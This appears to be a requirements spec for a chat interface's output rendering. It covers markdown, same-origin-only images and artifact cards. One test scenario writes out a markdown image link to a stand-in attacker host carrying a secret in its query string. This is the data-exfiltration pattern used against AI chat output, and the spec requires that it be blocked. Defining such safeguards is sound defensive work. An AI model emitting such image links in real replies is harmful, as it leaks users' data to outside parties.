## MODIFIED Requirements

### Requirement: Rich output rendering
The chat SHALL render markdown, tables and code blocks. Images SHALL be rendered only for same-origin URLs; external image URLs in model output SHALL be rendered as plain links. For each `artifact` event of a turn, the chat SHALL show image artifacts inline and every other kind as a card with name and kind that opens the artifact viewer; cards SHALL stay with the message when the session is reopened.

#### Scenario: Exfiltration image
- **WHEN** a reply contains `![x](https://evil.example/?q=secret)`
- **THEN** no request to `evil.example` is made and the URL is shown as a link

#### Scenario: Image artifact inline
- **WHEN** a turn's stream carries an `artifact` event of kind `image`
- **THEN** the image is shown inline in that reply

#### Scenario: Model artifact card
- **WHEN** a turn's stream carries an `artifact` event of kind `model3d`
- **THEN** the reply shows a card that opens the 3D viewer
